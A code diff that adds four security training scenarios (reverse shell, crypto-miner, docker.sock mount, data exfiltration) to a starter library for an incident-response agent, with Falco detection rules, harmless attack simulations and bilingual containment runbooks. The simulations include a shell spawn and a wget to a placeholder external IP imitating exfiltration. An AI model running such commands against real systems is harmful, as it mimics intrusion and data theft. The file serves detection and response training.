@@ -232,11 +232,170 @@ LIBRARY_STARTER: list[dict[str, Any]] = [
         "created_at": "2026-01-01T00:00:00Z",
         "updated_at": "2026-01-01T00:00:00Z",
     },
+    # ── Security domain (Phase 21) — 4 workshop scenarios ───────────────────
+    # Each maps 1:1 to a security runbook + a synthetic security event
+    # (agent/security_events.py). The optional attack_sim fires LIVE eBPF
+    # telemetry on real hardware; without it (or without Falco/Tetragon
+    # installed) the runner falls back to the synthetic event.
+    {
+        "id": "lib-reverse-shell",
+        "name": "Reverse shell in container",
+        "description_en": "An attacker spawns an interactive /bin/sh -i inside a running container — the classic 'we got popped' signal. The agent should isolate the pod to stop lateral movement, capture forensics, and escalate to incident response.",
+        "description_fr": "Un attaquant lance un shell interactif /bin/sh -i dans un conteneur — le signal classique de compromission. L'agent doit isoler le pod pour stopper les mouvements latéraux, capturer les preuves et escalader vers la réponse à incident.",
+        "tags": ["security", "reverse-shell", "containment"],
+        "domain": "security",
+        "target": {
+            "namespace": "workloads",
+            "pod_name": None,
+            "pod_label_selector": {"app": "nginx-demo"},
+            "owner_kind": "Deployment",
+        },
+        "falco": {
+            "rule": "Terminal shell in container",
+            "priority": "Critical",
+            "output_template": "A shell was spawned in a container with an attached terminal in {ns}/{pod}",
+            "output_fields": {
+                "event.type": "ProcessExec",
+                "proc.cmdline": "/bin/sh -i",
+                "proc.pname": "nginx",
+            },
+        },
+        "attack_sim": {"kind": "exec_shell", "command": ["/bin/sh", "-i"], "image": "busybox:1.36"},
+        "expectation": {
+            "diagnosis_keywords": ["shell", "reverse", "container"],
+            "proposed_tool": "isolate_pod",
+            "policy_allow": True,
+            "outcome": "escalated",
+        },
+        "runbook_en": "# Reverse shell\n\n**Symptom:** interactive `/bin/sh -i` spawned inside an app container.\n\n**Containment:** `isolate_pod` (deny-all NetworkPolicy) to cut the C2 channel, then `capture_forensics`.\n\n**Escalation:** always `page_security` — a confirmed reverse shell is an incident, not an SRE event.",
+        "runbook_fr": "# Shell inversé\n\n**Symptôme :** `/bin/sh -i` interactif lancé dans un conteneur applicatif.\n\n**Confinement :** `isolate_pod` (NetworkPolicy deny-all) pour couper le canal C2, puis `capture_forensics`.\n\n**Escalade :** toujours `page_security` — un shell inversé confirmé est un incident, pas un événement SRE.",
+        "created_at": "2026-01-01T00:00:00Z",
+        "updated_at": "2026-01-01T00:00:00Z",
+    },
+    {
+        "id": "lib-crypto-miner",
+        "name": "Crypto-miner / suspicious process",
+        "description_en": "An unexpected miner binary (xmrig) starts inside a pod and dials a mining pool — the most common post-exploitation payload. The agent isolates the pod (severing the pool connection), captures the wallet/pool IOCs, and escalates.",
+        "description_fr": "Un binaire de minage inattendu (xmrig) démarre dans un pod et contacte un pool de minage — la charge utile post-exploitation la plus courante. L'agent isole le pod, capture les IOC (portefeuille/pool) et escalade.",
+        "tags": ["security", "crypto-miner", "resource-abuse"],
+        "domain": "security",
+        "target": {
+            "namespace": "workloads",
+            "pod_name": None,
+            "pod_label_selector": {"app": "nginx-demo"},
+            "owner_kind": "Deployment",
+        },
+        "falco": {
+            "rule": "Launch suspicious tool / crypto-miner detected",
+            "priority": "Critical",
+            "output_template": "Process matching a miner signature started in {ns}/{pod}: xmrig",
+            "output_fields": {
+                "event.type": "ProcessExec",
+                "proc.name": "xmrig",
+                "net.dst.port": "4444",
+            },
+        },
+        "attack_sim": {
+            "kind": "run_miner",
+            "command": ["sh", "-c", "exec -a xmrig sleep 60"],
+            "image": "busybox:1.36",
+        },
+        "expectation": {
+            "diagnosis_keywords": ["miner", "xmrig", "suspicious"],
+            "proposed_tool": "isolate_pod",
+            "policy_allow": True,
+            "outcome": "escalated",
+        },
+        "runbook_en": "# Crypto-miner\n\n**Symptom:** a known miner binary (xmrig) or a process dialing a mining pool.\n\n**Containment:** `isolate_pod` — severing egress stops the mining and any C2. `capture_forensics` for the wallet/pool IOCs.\n\n**Escalation:** `page_security`; hunt the same miner across the fleet.",
+        "runbook_fr": "# Mineur de crypto\n\n**Symptôme :** un binaire de minage connu (xmrig) ou un processus contactant un pool de minage.\n\n**Confinement :** `isolate_pod` — couper l'egress arrête le minage et tout C2. `capture_forensics` pour les IOC.\n\n**Escalade :** `page_security` ; rechercher le même mineur sur toute la flotte.",
+        "created_at": "2026-01-01T00:00:00Z",
+        "updated_at": "2026-01-01T00:00:00Z",
+    },
+    {
+        "id": "lib-priv-esc",
+        "name": "Privilege escalation / sensitive mount",
+        "description_en": "A container mounts the container-runtime socket (/var/run/docker.sock) — a direct host-escape primitive. The agent isolates the pod, captures the mount evidence, and escalates with the NODE flagged as potentially compromised.",
+        "description_fr": "Un conteneur monte le socket du runtime (/var/run/docker.sock) — une primitive d'évasion directe vers l'hôte. L'agent isole le pod, capture la preuve du montage et escalade en signalant le NŒUD comme potentiellement compromis.",
+        "tags": ["security", "privilege-escalation", "container-escape"],
+        "domain": "security",
+        "target": {
+            "namespace": "workloads",
+            "pod_name": None,
+            "pod_label_selector": {"app": "nginx-demo"},
+            "owner_kind": "Deployment",
+        },
+        "falco": {
+            "rule": "Sensitive mount launched (container escape primitive)",
+            "priority": "Critical",
+            "output_template": "Container in {ns}/{pod} mounted /var/run/docker.sock — host-escape primitive",
+            "output_fields": {
+                "event.type": "ProcessExec",
+                "container.mounts": "/var/run/docker.sock:/var/run/docker.sock",
+                "container.privileged": "true",
+            },
+        },
+        "attack_sim": {
+            "kind": "sensitive_mount",
+            "command": ["sh", "-c", "ls -la /var/run/docker.sock || true"],
+            "image": "busybox:1.36",
+        },
+        "expectation": {
+            "diagnosis_keywords": ["mount", "escalation", "escape"],
+            "proposed_tool": "isolate_pod",
+            "policy_allow": True,
+            "outcome": "escalated",
+        },
+        "runbook_en": "# Privilege escalation\n\n**Symptom:** sensitive mount (docker/containerd socket, host /) or capability abuse.\n\n**Containment:** `isolate_pod` + `capture_forensics` (record the mount list + process tree).\n\n**Escalation:** `page_security` and flag the NODE — an escape attempt puts the host in scope (cordon + drain + reimage is a human decision).",
+        "runbook_fr": "# Élévation de privilèges\n\n**Symptôme :** montage sensible (socket docker/containerd, / de l'hôte) ou abus de capacité.\n\n**Confinement :** `isolate_pod` + `capture_forensics` (enregistrer les montages + l'arbre des processus).\n\n**Escalade :** `page_security` et signaler le NŒUD — une tentative d'évasion met l'hôte en jeu (cordon + drain + réimage = décision humaine).",
+        "created_at": "2026-01-01T00:00:00Z",
+        "updated_at": "2026-01-01T00:00:00Z",
+    },
+    {
+        "id": "lib-data-exfil",
+        "name": "Data exfiltration / suspicious egress",
+        "description_en": "A pod opens an outbound connection to an unexpected external IP and pushes data — the exfiltration / C2 stage. The agent applies a deny-egress NetworkPolicy (cutting the leak while keeping the pod observable) and escalates with the destination IOCs.",
+        "description_fr": "Un pod ouvre une connexion sortante vers une IP externe inattendue et pousse des données — la phase d'exfiltration / C2. L'agent applique une NetworkPolicy deny-egress (coupant la fuite tout en gardant le pod observable) et escalade avec les IOC de destination.",
+        "tags": ["security", "data-exfil", "egress", "c2"],
+        "domain": "security",
+        "target": {
+            "namespace": "workloads",
+            "pod_name": None,
+            "pod_label_selector": {"app": "nginx-demo"},
+            "owner_kind": "Deployment",
+        },
+        "falco": {
+            "rule": "Unexpected outbound connection (possible data exfiltration)",
+            "priority": "Error",
+            "output_template": "Pod {ns}/{pod} opened an outbound connection to an external IP (not in the egress allowlist)",
+            "output_fields": {
+                "event.type": "ProcessKprobe",
+                "net.dst.ip": "203.0.113.66",
+                "net.dst.port": "8443",
+            },
+        },
+        "attack_sim": {
+            "kind": "egress",
+            "command": ["sh", "-c", "wget -T 3 -qO- http://203.0.113.66:8443/ || true"],
+            "image": "busybox:1.36",
+        },
+        "expectation": {
+            "diagnosis_keywords": ["exfil", "egress", "outbound"],
+            "proposed_tool": "apply_network_policy",
+            "policy_allow": True,
+            "outcome": "escalated",
+        },
+        "runbook_en": "# Data exfiltration\n\n**Symptom:** outbound connection to an unexpected external IP / high egress volume / metadata-endpoint scrape.\n\n**Containment:** `apply_network_policy` (deny-egress, DNS excepted) cuts the leak but keeps the pod observable. `capture_forensics` for the destination IOCs.\n\n**Escalation:** `page_security`; assess what data could have left.",
+        "runbook_fr": "# Exfiltration de données\n\n**Symptôme :** connexion sortante vers une IP externe inattendue / fort volume d'egress / scrute du endpoint metadata.\n\n**Confinement :** `apply_network_policy` (deny-egress, DNS excepté) coupe la fuite tout en gardant le pod observable. `capture_forensics` pour les IOC.\n\n**Escalade :** `page_security` ; évaluer quelles données ont pu sortir.",
+        "created_at": "2026-01-01T00:00:00Z",
+        "updated_at": "2026-01-01T00:00:00Z",
+    },
 ]
 
 
 def seed_library_if_empty() -> None:
-    """Idempotent: writes the 3 library use cases if the file doesn't exist."""
+    """Idempotent: writes the library use cases (3 SRE + 4 security) if the
+    file doesn't exist. On an existing file, prune_invalid_and_migrate_library
+    adds any missing starter entries on startup."""
     p = _path()
     if p.exists():
         return
